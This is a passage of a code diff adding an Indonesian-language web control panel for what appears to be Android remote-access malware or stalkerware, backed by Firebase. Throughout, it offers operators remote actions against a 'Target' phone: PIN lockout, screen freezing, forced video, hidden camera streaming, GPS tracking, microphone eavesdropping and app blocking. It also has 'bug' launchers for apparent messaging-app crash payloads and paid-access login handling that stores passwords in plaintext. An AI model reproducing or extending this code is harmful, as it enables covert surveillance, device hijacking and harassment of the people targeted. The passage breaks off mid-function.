+    <button class="nav-item" data-frag="devices" onclick="switchFrag('devices',this)"><div class="icon"><svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg></div>Devices</button>
+    <button class="nav-item" data-frag="tools" onclick="switchFrag('tools',this)"><div class="icon"><svg viewBox="0 0 24 24"><path d="M22.7 19l-9.1-9.1c.9-2.3.4-5-1.5-6.9-2-2-5-2.4-7.4-1.3L9 6 6 9 1.6 4.7C.5 7.1.9 10.1 2.9 12.1c1.9 1.9 4.6 2.4 6.9 1.5l9.1 9.1c.4.4 1 .4 1.4 0l2.3-2.3c.5-.4.5-1.1.1-1.4z"/></svg></div>Tools</button>
+    <button class="nav-item" data-frag="chat" onclick="switchFrag('chat',this)"><div class="icon"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg></div>Chat & VN</button>
+    <button class="nav-item" data-frag="settings" onclick="switchFrag('settings',this)"><div class="icon"><svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.31.06-.63.06-.94 0-.31-.02-.63-.06-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.04.31-.06.63-.06.94s.02.63.06.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c-.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c-.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg></div>Settings</button>
+  </nav>
+</div>
+
+<!-- Modal Custom Picker (Pengganti Select Bawaan Browser) -->
+<div class="modal-bg" id="dialogCustomPicker">
+  <div class="modal-card">
+    <h3 id="pickerModalTitle">Pilih Opsi</h3>
+    <div class="sub" id="pickerModalSub">Ketuk salah satu pilihan di bawah</div>
+    <div class="picker-option-list" id="pickerOptionList"></div>
+    <div class="modal-actions">
+      <button class="btn-cancel" onclick="closeDialog('dialogCustomPicker')">Batal</button>
+    </div>
+  </div>
+</div>
+
+<!-- Modal Add Sender -->
+<div class="modal-bg" id="dialogAddSender">
+  <div class="modal-card">
+    <h3>Add Sender</h3>
+    <div class="sub">Tambahkan nomor sender baru</div>
+    <div class="modal-field"><label>Nomor / Nama Sender</label><input type="text" id="newSenderInput" placeholder="Contoh: 62812xxxx atau Nama"></div>
+    <div class="modal-actions">
+      <button class="btn-cancel" onclick="closeDialog('dialogAddSender')">Batal</button>
+      <button class="btn-ok" onclick="confirmAddSender()">Tambah</button>
+    </div>
+  </div>
+</div>
+
+<!-- Modal Buat Story -->
+<div class="modal-bg" id="dialogCreateStory">
+  <div class="modal-card">
+    <h3>Buat Story Baru</h3>
+    <div class="sub">Bagikan teks, foto, atau video singkat</div>
+    <div class="modal-field">
+      <label>Teks Caption Story</label>
+      <input type="text" id="storyTextInput" placeholder="Tulis sesuatu...">
+    </div>
+    <div class="modal-field">
+      <label>Upload Media (Foto / Video)</label>
+      <input type="file" id="storyMediaInput" accept="image/*,video/*" style="font-size:12px;padding:8px">
+    </div>
+    <div class="modal-actions">
+      <button class="btn-cancel" onclick="closeDialog('dialogCreateStory')">Batal</button>
+      <button class="btn-ok" onclick="confirmUploadStory()">Upload Story</button>
+    </div>
+  </div>
+</div>
+
+<!-- Modal Viewer Story (Full Screen ala WhatsApp Story DENGAN DAFTAR VIEWER & CENTANG BIRU) -->
+<div class="modal-bg" id="dialogViewStory" style="background:rgba(0,0,0,0.95);padding:0;">
+  <div style="position:relative;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;">
+    <button onclick="closeDialog('dialogViewStory')" style="position:absolute;top:20px;right:20px;background:rgba(255,255,255,0.3);border:2px solid #fff;color:#fff;width:44px;height:44px;border-radius:50%;font-size:22px;font-weight:900;cursor:pointer;z-index:10;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(0,0,0,0.5);">✕</button>
+    
+    <!-- TOMBOL HAPUS STORY -->
+    <button id="btnDeleteStoryModal" style="position:absolute;top:20px;right:74px;background:rgba(231,76,60,0.8);border:2px solid #fff;color:#fff;width:44px;height:44px;border-radius:50%;font-size:18px;font-weight:900;cursor:pointer;z-index:10;display:none;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(0,0,0,0.5);" onclick="triggerDeleteCurrentStory()" title="Hapus Story">🗑</button>
+
+    <div style="position:absolute;top:20px;left:20px;display:flex;align-items:center;gap:10px;z-index:10;">
+      <img id="viewStoryAvatar" src="" style="width:40px;height:40px;border-radius:50%;object-fit:cover;border:2px solid #fff;">
+      <div>
+        <div id="viewStoryUser" style="color:#fff;font-weight:700;font-size:14px;text-shadow:0 1px 4px rgba(0,0,0,0.8);display:flex;align-items:center;gap:4px;">
+          <span id="viewStoryUsernameText">Username</span>
+          <span id="viewStoryBadge"></span>
+        </div>
+        <div id="viewStoryTime" style="color:rgba(255,255,255,0.7);font-size:11px;text-shadow:0 1px 4px rgba(0,0,0,0.8)">Waktu</div>
+      </div>
+    </div>
+
+    <div id="viewStoryContentBox" style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;">
+      <!-- Fullscreen Media / Text -->
+    </div>
+
+    <!-- PANEL DAFTAR YANG MELIHAT STORY (VIEWER LIST ALA WHATSAPP) -->
+    <div style="position:absolute;bottom:20px;left:20px;right:20px;background:rgba(0,0,0,0.65);backdrop-filter:blur(8px);border-radius:16px;padding:10px 14px;color:#fff;display:flex;align-items:center;justify-content:space-between;z-index:10;box-shadow:0 4px 15px rgba(0,0,0,0.5);">
+      <div style="display:flex;align-items:center;gap:8px;font-size:13px;font-weight:600;">
+        <svg style="width:16px;height:16px;fill:#3498db" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+        <span>Dilihat oleh: <strong id="storyViewerCount">1</strong> orang</span>
+      </div>
+      <div id="storyViewerNames" style="font-size:12px;color:#ccc;max-width:50%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">Admin, Betran</div>
+    </div>
+  </div>
+</div>
+
+<!-- Modal Pilih Sender Type -->
+<div class="modal-bg" id="dialogChooseSender">
+  <div class="modal-card">
+    <h3>Pilih Tipe Sender</h3>
+    <div class="sub" id="chooseSenderSub">Pilih sebelum launch bug</div>
+    <div style="display:flex;flex-direction:column;gap:10px;margin-bottom:16px">
+      <button class="btn-ok" style="background:linear-gradient(145deg,#4a7c59,#2e5a3a)" onclick="launchBugWithSender('global')">GLOBAL SENDER</button>
+      <button class="btn-ok" style="background:linear-gradient(145deg,#c45c4a,#a03c2a)" onclick="launchBugWithSender('private')">PRIVATE SENDER</button>
+    </div>
+    <button class="btn-cancel" style="width:100%" onclick="closeDialog('dialogChooseSender')">Batal</button>
+  </div>
+</div>
+
+<div class="modal-bg" id="dialogLock">
+  <div class="modal-card">
+    <h3>Kunci Perangkat (PIN)</h3>
+    <div class="sub">Tampil dengan keypad custom di layar Target</div>
+    <div class="modal-field"><label>Pesan Peringatan</label><input type="text" id="lockTitle" value="PERANGKAT DIKUNCI OLEH ADMIN"></div>
+    <div class="modal-field"><label>PIN Buka Kunci</label><input type="number" id="lockPin" value="1234"></div>
+    <div class="modal-actions">
+      <button class="btn-cancel" onclick="closeDialog('dialogLock');setSwitchOff('is_locked')">Batal</button>
+      <button class="btn-ok" onclick="confirmLock()">Kunci Sekarang</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-bg" id="dialogVideo">
+  <div class="modal-card">
+    <h3>Putar Video Fullscreen</h3>
+    <div class="sub">Paksa putar video di HP Target</div>
+    <div class="modal-field"><label>URL / File Video</label><input type="text" id="videoUrl" value="https://www.w3schools.com/html/mov_bbb.mp4" placeholder="https://..."></div>
+    <div class="modal-actions">
+      <button class="btn-cancel" onclick="closeDialog('dialogVideo');setSwitchOff('video_url')">Batal</button>
+      <button class="btn-ok" onclick="confirmVideo()">Putar Video</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-bg" id="dialogCamera">
+  <div class="modal-card">
+    <h3>Kamera Live Stream</h3>
+    <div class="sub">Tangkapan kamera belakang Target</div>
+    <div class="preview-box" id="camPreview">
+      <div class="preview-placeholder" id="camPlaceholder">Menunggu stream...</div>
+      <img id="camImg" style="display:none">
+      <div class="preview-status" id="camStatus">Menghubungkan...</div>
+    </div>
+    <div class="modal-actions">
+      <button class="btn-cancel" onclick="stopCamera()">Tutup</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-bg" id="dialogBlock">
+  <div class="modal-card" style="max-height:80vh;overflow-y:auto">
+    <h3>Blokir Aplikasi</h3>
+    <div class="sub">Pilih aplikasi yang terinstal di HP Target</div>
+    <div id="appListContainer"><div style="text-align:center;padding:12px;color:var(--text-soft)">Memuat daftar aplikasi...</div></div>
+    <div class="modal-actions" style="margin-top:16px">
+      <button class="btn-cancel" onclick="closeDialog('dialogBlock')">Tutup</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-bg" id="dialogGps">
+  <div class="modal-card">
+    <h3>Lokasi GPS Real-Time</h3>
+    <div class="sub">Koordinat posisi HP Target</div>
+    <div style="background:var(--milk-deep);border-radius:14px;padding:16px;margin-bottom:16px;text-align:center">
+      <div style="font-size:13px;color:var(--text-soft)">Latitude & Longitude</div>
+      <div id="gpsCoords" style="font-size:16px;font-weight:700;margin-top:6px">Mencari sinyal...</div>
+    </div>
+    <div class="modal-actions">
+      <button class="btn-cancel" onclick="closeDialog('dialogGps')">Tutup</button>
+      <button class="btn-ok" onclick="openMaps()">Buka di Google Maps</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-bg" id="dialogMaintenanceError">
+  <div class="modal-card" style="text-align: center; border: 1px solid var(--accent);">
+    <div style="width: 50px; height: 50px; margin: 0 auto 12px; background: linear-gradient(145deg, var(--milk-deep), var(--accent)); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 12px var(--shadow);">
+      <svg style="width: 24px; height: 24px; fill: var(--accent-deep);" viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+    </div>
+    <h3 style="color: var(--accent-deep); font-size: 19px; margin-bottom: 6px;">SERVER ERROR 400</h3>
+    <div class="sub" id="maintenanceErrorText" style="margin-bottom: 20px;">Mohon maaf, server sedang dalam pemeliharaan (Maintenance). Silakan coba beberapa saat lagi.</div>
+    <button class="btn-ok" onclick="closeDialog('dialogMaintenanceError')">Mengerti</button>
+  </div>
+</div>
+
+<script>
+const firebaseConfig = { databaseURL: "https://betran99-77e19-default-rtdb.firebaseio.com" };
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+let activeDeviceId = null;
+let statusRef = null;
+let chatRef = null;
+let storyRef = null;
+let loggedInUser = "Admin";
+let currentUserRole = "Member";
+let isUserVerified = false;
+let userAvatar = "";
+let mediaRecorder = null;
+let audioChunks = [];
+let isRecordingVN = false;
+let currentAudioPlaying = null;
+let introSkipped = false;
+let isUpdatingSwitch = false;
+let isUserInteracting = false;
+let slotUserBalance = 1000000;
+let storyTimer = null;
+let currentViewingStoryKey = null; // Menyimpan key story yang sedang dilihat untuk dialog hapus bawaan
+
+// Menyimpan nilai pilihan kustom saat membuat user & slot
+let selectedRoleValue = "Member";
+let selectedDurationValue = "30";
+let selectedBetValue = "10000";
+
+var devices = [{ name:'Device Not Found', meta:'Tidak ada perangkat', batt:'—', net:'—', online:false }];
+var currentIdx = 0;
+var deviceStates = { 0: {} };
+var lastGps = { lat:-6.2088, lng:106.8456 };
+
+var musicList = [
+  { title: "Judul ed Sharen Photograph-bye", url: "https://files.catbox.moe/4f0vuz.mp3" },
+  { title: "Bruno Mars - Locked Out Of Heaven", url: "https://files.catbox.moe/3f5mj6.mp3" },
+  { title: "Ariana Grande - bye", url: "https://files.catbox.moe/o5k6sw.mp3" },
+  { title: "bruno mars - it will rain", url: "https://files.catbox.moe/8aisob.mp3" },
+  { title: "Billie Eilish - WILDFLOWER", url: "https://files.catbox.moe/q8ungv.mp3" },
+  { title: "Send My Love", url: "https://files.catbox.moe/s45j8c.mp3" },
+  { title: "Don't You Remember", url: "https://files.catbox.moe/r52zsx.mp3" },
+  { title: "Rihanna - Umbrella", url: "https://files.catbox.moe/v1is9u.mp3" },
+  { title: "Billie Eilish - BIRDS OF A FEATHER", url: "https://files.catbox.moe/xi1m9c.mp3" }
+];
+
+var tools = [
+  { key:'is_locked',    name:'Full Lock Screen + PIN',  tag:'Kunci layar dengan PIN angka custom' },
+  { key:'is_frozen',    name:'Freeze Layar (Sentuh Off)',tag:'Blokir total sentuhan layar HP Target' },
+  { key:'flash_active', name:'Senter Berkedip (Prank)', tag:'Nyalakan kedip flash otomatis' },
+  { key:'video_url',    name:'Putar Video Fullscreen',   tag:'Paksa putar video di HP Target' },
+  { key:'camera_active',name:'Kamera Live Stream',      tag:'Streaming kamera tersembunyi' },
+  { key:'block_app',    name:'Blokir Aplikasi',         tag:'Cegah Target buka app tertentu' },
+  { key:'gps_active',   name:'GPS Tracker',             tag:'Pantau koordinat lokasi Target' },
+  { key:'screen_blink', name:'Layar Kedip Hitam',       tag:'Efek prank layar berkedip' },
+  { key:'spam_keyboard',name:'Spam Keyboard / Dialog',  tag:'Ganggu layar dengan pop-up input' },
+  { key:'audio_record', name:'Sadap Suara (Audio Spy)', tag:'Status perekaman mikrofon aktif' }
+];
+
+/* ===== BUG TOOLS ===== */
+let selectedPayload = 'crash-v1';
+let pendingBugType = null;
+let customSenders = [];
+
+function selectPayload(el){
+  document.querySelectorAll('.payload-card').forEach(c => c.classList.remove('active'));
+  el.classList.add('active');
+  selectedPayload = el.getAttribute('data-payload');
+  toast('Payload dipilih: ' + selectedPayload);
+}
+
+function prepareBug(type){
+  pendingBugType = type;
+  document.getElementById('chooseSenderSub').textContent = 'Launch Bug ' + (type === 'nomor' ? 'Nomor' : 'Grup') + ' · Payload: ' + selectedPayload;
+  openDialog('dialogChooseSender');
+}
+
+function launchBugWithSender(senderType){
+  closeDialog('dialogChooseSender');
+  var label = pendingBugType === 'nomor' ? 'BUG NOMOR' : 'BUG GRUP';
+  toast(label + ' diluncurkan via ' + (senderType === 'global' ? 'GLOBAL' : 'PRIVATE') + ' SENDER · ' + selectedPayload);
+  pendingBugType = null;
+}
+
+function openAddSender(){
+  document.getElementById('newSenderInput').value = '';
+  openDialog('dialogAddSender');
+}
+
+function confirmAddSender(){
+  var val = document.getElementById('newSenderInput').value.trim();
+  if(!val){
+    toast('Isi nomor/nama sender dulu');
+    return;
+  }
+  customSenders.push(val);
+  renderSenderList();
+  closeDialog('dialogAddSender');
+  toast('Sender ditambahkan');
+}
+
+function renderSenderList(){
+  var el = document.getElementById('senderListDisplay');
+  if(customSenders.length === 0){
+    el.textContent = 'Belum ada sender ditambahkan';
+    return;
+  }
+  el.innerHTML = customSenders.map(s => '<span class="sender-chip">' + s + '</span>').join('');
+}
+/* ===== END BUG TOOLS ===== */
+
+window.addEventListener('DOMContentLoaded', function(){
+  var savedUser = localStorage.getItem('milk_saved_user');
+  var savedPass = localStorage.getItem('milk_saved_pass');
+  
+  if(savedUser) {
+    loggedInUser = savedUser;
+    var userSpecificAvatar = localStorage.getItem('milk_saved_avatar_' + savedUser);
+    if(userSpecificAvatar) {
+      userAvatar = userSpecificAvatar;
+    } else {
+      userAvatar = 'https://via.placeholder.com/90';
+    }
+    updateAllAvatars(userAvatar);
+  }
+
+  setInterval(updateLiveClockAndCountdown, 1000);
+  updateLiveClockAndCountdown();
+  renderMusicPlayerList();
+
+  startVerification();
+
+  if(savedUser && savedPass){
+    document.getElementById('user').value = savedUser;
+    document.getElementById('pass').value = savedPass;
+  }
+});
+
+function startVerification(){
+  var statusEl = document.getElementById('verifyStatus');
+  var steps = [
+    { id: 'step1', text: 'Memverifikasi perangkat...', delay: 800 },
+    { id: 'step2', text: 'Memeriksa koneksi internet...', delay: 900 },
+    { id: 'step3', text: 'Validasi sesi user...', delay: 850 },
+    { id: 'step4', text: 'Membangun channel aman...', delay: 1000 }
+  ];
+  var i = 0;
+  function nextStep(){
+    if(i >= steps.length){
+      statusEl.textContent = 'Verifikasi selesai';
+      setTimeout(function(){
+        document.getElementById('loadingVerify').classList.remove('active');
+        document.getElementById('menuSelect').classList.add('active');
+        var vid = document.getElementById('menuBgVideo');
+        if(vid) vid.play().catch(function(){});
+      }, 600);
+      return;
+    }
+    var s = steps[i];
+    statusEl.textContent = s.text;
+    var el = document.getElementById(s.id);
+    if(el) el.classList.add('done');
+    i++;
+    setTimeout(nextStep, s.delay);
+  }
+  setTimeout(nextStep, 400);
+}
+
+function goToLogin(){
+  document.getElementById('menuSelect').classList.remove('active');
+  document.getElementById('login').classList.add('active');
+}
+
+function openBuyAccess(){
+  window.open('https://t.me/', '_blank');
+}
+
+function openGroupDev(){
+  window.open('https://t.me/', '_blank');
+}
+
+function updateLiveClockAndCountdown(){
+  var now = new Date();
+  var hours = String(now.getHours()).padStart(2, '0');
+  var minutes = String(now.getMinutes()).padStart(2, '0');
+  var seconds = String(now.getSeconds()).padStart(2, '0');
+  var timeString = hours + ':' + minutes + ':' + seconds + ' WIB';
+  if(document.getElementById('liveClockText')) document.getElementById('liveClockText').textContent = timeString;
+
+  var options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+  var dateString = now.toLocaleDateString('id-ID', options);
+  if(document.getElementById('liveDateText')) document.getElementById('liveDateText').textContent = dateString;
+}
+
+function updateAllAvatars(url){
+  var avatarEls = document.querySelectorAll('#tiktokProfileImg');
+  avatarEls.forEach(function(img){
+    img.src = url;
+  });
+}
+
+function goLogin(){
+  introSkipped = true;
+  document.getElementById('login').classList.add('active');
+}
+
+function startVideoIntro(targetDeviceId){
+  document.getElementById('login').classList.remove('active');
+  document.getElementById('videoIntro').classList.add('active');
+  var vid = document.getElementById('introVid');
+  vid.play().catch(function(e){
+    console.log('Autoplay blocked:', e);
+  });
+}
+
+function finishVideoIntro(){
+  document.getElementById('videoIntro').classList.remove('active');
+  document.getElementById('main').classList.add('active');
+  var vid = document.getElementById('introVid');
+  vid.pause();
+  vid.currentTime = 0;
+  if(window.currentSessionDeviceId) {
+    initListener(window.currentSessionDeviceId);
+    forceRefresh();
+  }
+}
+
+function initListener(deviceId) {
+  activeDeviceId = deviceId;
+  if(statusRef) statusRef.off();
+  if(chatRef) chatRef.off();
+  if(storyRef) storyRef.off();
+
+  statusRef = db.ref('device_status/' + deviceId);
+  chatRef = db.ref('global_chat');
+  storyRef = db.ref('global_stories');
+
+  document.getElementById('currentHostMeta').textContent = 'device_status/' + deviceId + ' @ Firebase';
+  if(document.getElementById('statDeviceIdDisplay')) {
+    document.getElementById('statDeviceIdDisplay').textContent = deviceId;
+  }
+
+  statusRef.on('value', function(snap) {
+    var data = snap.val();
+    updateFromData(data);
+  });
+
+  chatRef.limitToLast(30).on('value', function(snap) {
+    var msgs = snap.val();
+    var html = '';
+    if (msgs) {
+      Object.keys(msgs).forEach(function(key){
+        var m = msgs[key];
+        var isMe = m.sender === loggedInUser;
+        var avatar = m.avatar || userAvatar || 'https://via.placeholder.com/32';
+        var verifiedHtml = m.isVerified ? '<span class="verified-badge-inline" title="Verified Admin">✓</span>' : '';
+        
+        html += '<div class="chat-bubble '+(isMe?'me':'other')+'">' +
+          '<img class="chat-avatar" src="'+avatar+'">' +
+          '<div class="chat-content-box">' +
+            '<div class="sender">'+m.sender+' '+verifiedHtml+'</div>';
+        
+        if(m.type === 'vn' && m.audioUrl) {
+          html += '<div class="vn-player">' +
+            '<button class="vn-play-btn" onclick="playVN(this, \''+m.audioUrl+'\')">▶</button>' +
+            '<div class="vn-waves">' +
+              '<div class="vn-wave-bar"></div><div class="vn-wave-bar"></div><div class="vn-wave-bar"></div><div class="vn-wave-bar"></div><div class="vn-wave-bar"></div>' +
+            '</div>' +
+            '<span class="vn-duration">VN</span>' +
+          '</div>';
+        } else if(m.type === 'photo' && m.photoUrl) {
+          html += '<div style="margin-top:4px"><img src="'+m.photoUrl+'" style="max-width:100%;max-height:200px;border-radius:10px;object-fit:cover"></div>';
+          if(m.text) {
+            html += '<div style="margin-top:4px">'+m.text+'</div>';
+          }
+        } else {
+          html += '<div>'+(m.text || '')+'</div>';
+        }
+        html += '</div></div>';
+      });
+    } else {
+      html = '<div style="text-align:center;color:var(--text-soft);font-size:12px;padding:20px">Belum ada pesan. Kirim "hii" atau Voice Note.</div>';
+    }
+    var box = document.getElementById('chatMessagesBox');
+    box.innerHTML = html;
+    box.scrollTop = box.scrollHeight;
+  });
+
+  // Listener untuk Story Pengguna di Home (Otomatis hapus/reset setelah 24 jam seperti WhatsApp)
+  storyRef.on('value', function(snap){
+    var stories = snap.val();
+    var trayEl = document.getElementById('homeStoryTray');
+    if(!stories){
+      trayEl.innerHTML = '<div style="font-size:12px;color:var(--text-soft);padding:6px">Belum ada story. Buat story baru sekarang!</div>';
+      return;
+    }
+    var html = '';
+    var now = Date.now();
+    var twentyFourHours = 24 * 60 * 60 * 1000;
+    var hasValidStory = false;
+
+    Object.keys(stories).forEach(function(key){
+      var st = stories[key];
+      var stTime = st.timestamp || 0;
+      
+      // Jika umur story sudah lebih dari 24 jam, hapus otomatis dari Firebase
+      if (now - stTime > twentyFourHours) {
+        storyRef.child(key).remove();
+        return;
+      }
+
+      hasValidStory = true;
+      var timeAgo = Math.round((now - stTime) / (1000 * 60)) + ' menit yang lalu';
+      if(now - stTime > 3600000) {
+        timeAgo = Math.round((now - stTime) / (1000 * 60 * 60)) + ' jam yang lalu';
+      }
+
+      // Centang biru di story tray beranda
+      var badgeStory = st.isVerified ? '<span class="verified-badge-inline" title="Verified" style="width:12px;height:12px;font-size:8px;margin-left:2px;">✓</span>' : '';
+
+      html += '<div class="story-item" onclick=\'viewStory("'+key+'", "'+st.sender+'", "'+(st.avatar || '')+'", "'+encodeURIComponent(st.text||'')+'", "'+encodeURIComponent(st.mediaUrl||'')+'", "'+st.mediaType+'", "'+timeAgo+'", '+!!st.isVerified+')\'>' +
+        '<div class="story-ring">' +
+          '<img class="story-avatar" src="'+(st.avatar || 'https://via.placeholder.com/64')+'">' +
+        '</div>' +
+        '<div class="story-name">'+st.sender+badgeStory+'</div>' +
+      '</div>';
+    });
+
+    if(!hasValidStory){
+      trayEl.innerHTML = '<div style="font-size:12px;color:var(--text-soft);padding:6px">Belum ada story. Buat story baru sekarang!</div>';
+    } else {
+      trayEl.innerHTML = html;
+    }
+  });
+}
+
+function updateFromData(data) {
+  if (!data) {
+    devices[0] = { name: 'Device Not Found', meta: 'Tidak ada data perangkat di server', batt: '—', net: '—', online: false };
+    renderDevices();
+    return;
+  }
+
+  var now = Date.now();
+  var last = Number(data.last_online) || 0;
+  var online = last > 0 && (now - last) <= 60000;
+
+  var realDeviceName = data.device_name || data.model || (activeDeviceId ? 'Device: ' + activeDeviceId : 'Device Not Found');
+
+  devices[0].name = realDeviceName;
+  devices[0].online = online;
+  devices[0].batt = 'Aktif';
+  devices[0].net = online ? 'Online' : 'Offline';
+
+  if (data.gps_lat && data.gps_lng) {
+    lastGps = { lat: Number(data.gps_lat), lng: Number(data.gps_lng) };
+    if(document.getElementById('gpsCoords')) {
+      document.getElementById('gpsCoords').textContent = lastGps.lat.toFixed(6) + ', ' + lastGps.lng.toFixed(6);
+    }
+  }
+
+  deviceStates[0] = {
+    is_locked:     !!data.is_locked,
+    is_frozen:     !!data.is_frozen,
+    flash_active:  !!data.flash_active,
+    video_url:     !!(data.video_url && data.video_url.length > 0),
+    camera_active: !!data.camera_active,
+    block_app:     !!(data.blocked_app && data.blocked_app.length > 0),
+    gps_active:    !!data.gps_active,
+    screen_blink:  !!data.screen_blink,
+    spam_keyboard: !!data.spam_keyboard,
+    audio_record:  !!data.audio_record
+  };
+
+  var st = document.getElementById('ctrlStatusText');
+  if (st) {
+    st.textContent = online ? 'Online' : 'Offline';
+    st.style.color = online ? '#2ecc71' : '#e74c3c';
+  }
+  if (document.getElementById('ctrlBatt')) document.getElementById('ctrlBatt').textContent = online ? 'Terhubung' : '—';
+  if (document.getElementById('ctrlNet')) document.getElementById('ctrlNet').textContent = online ? 'Stabil' : '—';
+  
+  var ctrlNameElem = document.getElementById('ctrlName');
+  if (ctrlNameElem) ctrlNameElem.textContent = realDeviceName;
+
+  if (data.camera_frame) {
+    var img = document.getElementById('camImg');
+    var ph = document.getElementById('camPlaceholder');
+    if (img) {
+      img.src = 'data:image/jpeg;base64,' + data.camera_frame;
+      img.style.display = 'block';
+      if (ph) ph.style.display = 'none';
+    }
+    var cs = document.getElementById('camStatus');
+    if (cs) cs.textContent = 'Live Streaming...';
+  }
+
+  if (data.installed_apps) {
+    renderAppListFromFirebase(data.installed_apps, data.blocked_app);
+  }
+
+  var dbg = document.getElementById('debugInfo');
+  if (dbg) {
+    var age = last > 0 ? Math.round((now - last) / 1000) + 's lalu' : 'belum ada aktivitas';
+    dbg.textContent = 'Nama HP: ' + realDeviceName + ' | Terakhir Online: ' + age + ' | Status: ' + (online ? 'ONLINE' : 'OFFLINE');
+  }
+
+  renderDevices();
+  
+  if (document.getElementById('frag-control') && document.getElementById('frag-control').classList.contains('active')) {
+    if (!isUserInteracting) {
+      isUpdatingSwitch = true;
+      renderTools();
+      isUpdatingSwitch = false;
+    }
+  }
+}
+
+function forceRefresh() {
+  if (statusRef) {
+    statusRef.once('value', function(snap) {
+      updateFromData(snap.val());
+      toast('Status berhasil diperbarui');
+    }, function(err){
+      devices[0].name = 'Device Not Found';
+      renderDevices();
+      toast('Device Not Found');
+    });
+  } else {
+    devices[0].name = 'Device Not Found';
+    renderDevices();
+  }
+}
+
+function doLogin(isAuto){
+  var u = document.getElementById('user').value.trim();
+  var p = document.getElementById('pass').value.trim();
+  var errBox = document.getElementById('loginErr');
+
+  if (!u || !p) {
+    if(!isAuto) {
+      errBox.textContent = 'Username dan Password wajib diisi!';
+      errBox.style.display = 'block';
+    }
+    return;
+  }
+
+  if(!isAuto) {
+    errBox.textContent = 'Memeriksa status server...';
+    errBox.style.display = 'block';
+  }
+
+  db.ref('system_config').once('value', function(configSnap) {
+    var configData = configSnap.val();
+    if (configData && configData.is_maintenance) {
+      errBox.style.display = 'none';
+      var customMsg = configData.update_message || 'Mohon maaf, server sedang dalam pemeliharaan (Maintenance). Silakan coba beberapa saat lagi.';
+      document.getElementById('maintenanceErrorText').textContent = customMsg;
+      openDialog('dialogMaintenanceError');
+      return;
+    }
+
+    loggedInUser = u;
+    
+    var userSpecificAvatar = localStorage.getItem('milk_saved_avatar_' + u);
+    userAvatar = userSpecificAvatar ? userSpecificAvatar : 'https://via.placeholder.com/90';
+    updateAllAvatars(userAvatar);
+
+    if(!isAuto) {
+      errBox.textContent = 'Memeriksa akun...';
+      errBox.style.display = 'block';
+    }
+
+    db.ref('users/' + u).once('value', function(snapshot) {
+      if (snapshot.exists()) {
+        var userData = snapshot.val();
+        
+        if (userData.password !== p) {
+          if(!isAuto) {
+            errBox.textContent = 'Password salah!';
+            errBox.style.display = 'block';
+          }
+          return;
+        }
+
+        currentUserRole = userData.role || 'Member';
+        isUserVerified = !!userData.isVerified; // Cek centang biru khusus admin
+
+        if(document.getElementById('currentUserRoleDisplay')) {
+          document.getElementById('currentUserRoleDisplay').textContent = currentUserRole;
+        }
+
+        // Render centang biru di profil settings jika terverifikasi
+        var profileBadgeEl = document.getElementById('profileVerifiedBadge');
+        if (profileBadgeEl) {
+          profileBadgeEl.innerHTML = isUserVerified ? '<span class="verified-badge-inline" title="Verified Admin">✓</span>' : '';
+        }
+
+        // Setup UI Create User sesuai Role
+        setupRoleCreateUserUI(currentUserRole);
+
+        if(document.getElementById('tiktokUsernameDisplay')) {
+          document.getElementById('tiktokUsernameDisplay').innerHTML = u + ' ' + (isUserVerified ? '<span class="verified-badge-inline" title="Verified Admin">✓</span>' : '');
+        }
+        if(document.getElementById('tiktokHandleDisplay')) document.getElementById('tiktokHandleDisplay').textContent = '@' + u.toLowerCase() + '_vip';
+
+        var expireTime = userData.expireTimestamp || (Date.now() + 86400000 * 30);
+        var currentTime = new Date().getTime();
+        if (currentTime > expireTime) {
+          if(!isAuto) {
+            errBox.textContent = 'Akses ditolak! Masa aktif akun sudah habis.';
+            errBox.style.display = 'block';
+          }
+          return;
+        }
+
+        var diffDays = Math.ceil((expireTime - currentTime) / (1000 * 60 * 60 * 24));
+        document.getElementById('homeAccountTime').textContent = 'Akun aktif tersisa: ' + diffDays + ' hari lagi (' + new Date(expireTime).toLocaleDateString() + ')';
+        if(document.getElementById('liveCountdownText')) {
